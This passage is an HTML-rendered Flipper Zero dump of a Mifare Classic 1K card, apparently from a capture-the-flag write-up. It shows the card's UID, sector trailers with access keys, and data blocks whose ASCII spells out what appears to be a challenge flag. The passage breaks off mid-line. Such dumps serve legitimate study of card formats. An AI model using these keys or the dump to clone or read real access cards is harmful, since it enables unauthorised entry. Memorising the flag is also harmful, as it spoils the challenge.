class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Filetype</span>: Flipper NFC device<br><span class="hljs-attribute">Version</span>: <span class="hljs-number">4</span><br><span class="hljs-comment"># Device type can be ISO14443-3A, ISO14443-3B, ISO14443-4A, ISO14443-4B, ISO15693-3, FeliCa, NTAG/Ultralight, Mifare Classic, Mifare Plus, Mifare DESFire, SLIX, ST25TB</span><br><span class="hljs-attribute">Device</span> type: Mifare Classic<br><span class="hljs-comment"># UID is common for all formats</span><br><span class="hljs-attribute">UID</span>: <span class="hljs-number">6</span>D <span class="hljs-number">79</span> <span class="hljs-number">5</span>F <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span><br><span class="hljs-comment"># ISO14443-3A specific data</span><br><span class="hljs-attribute">ATQA</span>: <span class="hljs-number">00</span> <span class="hljs-number">44</span><br><span class="hljs-attribute">SAK</span>: <span class="hljs-number">08</span><br><span class="hljs-comment"># Mifare Classic specific data</span><br><span class="hljs-attribute">Mifare</span> Classic type: <span class="hljs-number">1</span>K<br><span class="hljs-attribute">Data</span> format version: <span class="hljs-number">2</span><br><span class="hljs-comment"># Mifare Classic blocks, &#x27;??&#x27; means unknown data</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">0</span>: <span class="hljs-number">6</span>D <span class="hljs-number">79</span> <span class="hljs-number">5</span>F <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span> <span class="hljs-number">08</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> FF FF FF FF FF FF<br><span class="hljs-attribute">Block</span> <span class="hljs-number">1</span>: C0 <span class="hljs-number">01</span> <span class="hljs-number">03</span> E1 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">2</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">3</span>: A0 A1 A2 A3 A4 A5 <span class="hljs-number">78</span> <span class="hljs-number">77</span> <span class="hljs-number">88</span> C1 <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">4</span>: <span class="hljs-number">03</span> <span class="hljs-number">30</span> D1 <span class="hljs-number">01</span> <span class="hljs-number">2</span>C <span class="hljs-number">54</span> <span class="hljs-number">02</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>E <span class="hljs-number">6</span>d <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">74</span> <span class="hljs-number">33</span> <span class="hljs-number">72</span> <span class="hljs-number">31</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">5</span>: <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">5</span>f <span class="hljs-number">73</span> <span class="hljs-number">37</span> <span class="hljs-number">72</span> <span class="hljs-number">75</span> <span class="hljs-number">63</span> <span class="hljs-number">37</span> <span class="hljs-number">75</span> <span class="hljs-number">72</span> <span class="hljs-number">33</span> <span class="hljs-number">5</span>f <span class="hljs-number">30</span> <span class="hljs-number">66</span> <span class="hljs-number">5</span>f <br><span class="hljs-attribute">Block</span> <span class="hljs-number">6</span>: <span class="hljs-number">6</span>d <span class="hljs-number">31</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">33</span> <span class="hljs-number">5</span>f <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">64</span> <span class="hljs-number">5</span>f <span class="hljs-number">70</span> <span class="hljs-number">58</span> <span class="hljs-number">4</span>c <span class="hljs-number">46</span> <br><span class="hljs-attribute">Block</span> <span class="hljs-number">7</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">8</span>: <span class="hljs-number">4</span>f <span class="hljs-number">74</span> <span class="hljs-number">46</span> <span class="hljs-number">4</span>a <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>b <span class="hljs-number">43</span> <span class="hljs-number">6</span>b <span class="hljs-number">62</span> <span class="hljs-number">50</span> <span class="hljs-number">68</span> <span class="hljs-number">4</span>e <span class="hljs-number">50</span> <span class="hljs-number">7</span>a <span class="hljs-number">56</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">9</span>: FE <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">10</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">11</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">12</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">13</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">14</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">15</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">16</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">17</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">18</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">19</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">20</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">21</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">22</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">23</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">24</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">25</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">26</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">27</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">28</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">29</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">30</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">31</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">32</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">33</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">34</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">35</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">36</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">37</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">38</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">39</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">40</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">41</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">42</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">43</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">44</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">45</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">46</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">47</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">48</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">49</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">50</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">51</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">52</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">53</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">54</span>: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">Block</span> <span class="hljs-number">55</span>: <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>c <span class="hljs-number">67</span> <span class="hljs-number">45</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">73</span> <span class="hljs-number">64</span> <span class="hljs-number">49</span> <span class="hljs-number">65</span> <span 